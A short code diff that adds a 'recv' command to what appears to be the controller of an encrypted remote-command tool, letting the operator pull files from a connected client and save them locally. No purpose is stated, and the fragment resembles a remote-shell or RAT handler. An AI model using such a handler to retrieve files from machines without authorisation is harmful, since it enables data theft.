@@ -57,6 +57,12 @@ while True:
     if CMD == "exit":
         client.close()
         break
+    elif CMD.startswith("recv "):
+        DATEINAME = CMD.replace("recv ", "")
+        recv_len = int.from_bytes(recv_exact(client, 4), "big")
+        DATEIINHALT = fernet.decrypt( recv_exact(client, recv_len) )
+        with open(DATEINAME, "wb") as data:
+            data.write(DATEIINHALT)
 
     length = int.from_bytes(recv_exact(client, 4), "big")
     out = fernet.decrypt(recv_exact(client, length)).decode()
